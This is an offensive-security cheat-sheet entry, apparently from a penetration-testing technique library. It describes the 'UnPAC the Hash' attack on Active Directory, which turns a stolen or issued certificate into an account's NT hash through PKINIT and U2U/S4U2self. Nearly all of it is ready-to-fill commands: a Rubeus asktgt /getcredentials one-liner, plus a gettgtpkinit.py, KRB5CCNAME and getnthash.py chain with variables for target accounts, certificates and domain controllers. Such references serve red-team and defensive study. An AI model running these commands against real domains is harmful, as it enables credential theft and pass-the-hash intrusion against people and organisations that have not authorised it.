---
technique: UnPAC the Hash
category: kerberos
targets: User, Computer
protocols: Kerberos
remote_capable: true
tags: kerberos unpac-the-hash pkinit pac nt-hash u2u s4u2self ad
---

# UnPAC the Hash

When PKINIT is used to obtain a TGT, the KDC embeds the authenticating account's NT and LM hashes inside the ticket's PAC (`PAC_CREDENTIAL_INFO`). Those hashes can be recovered via a TGS-REQ combining U2U (User-to-User) and S4U2self, the user requests a ticket to themselves, and the resulting PAC is readable with the session key from the original PKINIT exchange. This converts certificate-based access into an NT hash usable for pass-the-hash or further Kerberos attacks.

## Windows

### Rubeus

#powershell #pkinit #getcredentials

Request a TGT via PKINIT and recover the NT hash in a single step using the `/getcredentials` flag.

```powershell title:"PKINIT TGT request with automatic NT hash recovery"
.\Rubeus.exe asktgt /getcredentials /user:"$target_samname" /certificate:"$b64_cert" /password:"$pfx_pass" /domain:"$domain" /dc:"$dc_fqdn" /show
```
<!-- cheat
import domain_ip
var target_samname
var b64_cert
var pfx_pass
var dc_fqdn
-->

## Linux

### Step 1: Obtain TGT via PKINIT (gettgtpkinit.py)

#python #pkinit #u2u

Request a TGT using a PFX certificate via PKINIT; the session key from this exchange is required for hash recovery.

```sh title:"Request PKINIT TGT via gettgtpkinit.py"
gettgtpkinit.py -cert-pfx "$pfx_file" -pfx-pass "$pfx_pass" "$domain/$target_samname" tgt.ccache
```
<!-- cheat
import domain_ip
var pfx_file
var pfx_pass
var target_samname
-->

### Step 2: Set KRB5CCNAME to PKINIT TGT

#shell #env

Set KRB5CCNAME to the ccache written by gettgtpkinit.py before running getnthash.py.

```sh title:"Load PKINIT TGT ccache into KRB5CCNAME"
export KRB5CCNAME=tgt.ccache
```
<!-- cheat -->

### Step 3: Recover NT hash from PAC (getnthash.py)

#python #pkinit #u2u

Use the AS-REP encryption key from the PKINIT exchange to perform U2U and extract the NT hash from the PAC.

```sh title:"Recover NT hash from PKINIT PAC via getnthash.py"
getnthash.py -key "$asrep_key" "$domain/$target_samname"
```
<!-- cheat
import domain_ip
var target_samname
var asrep_key
-->
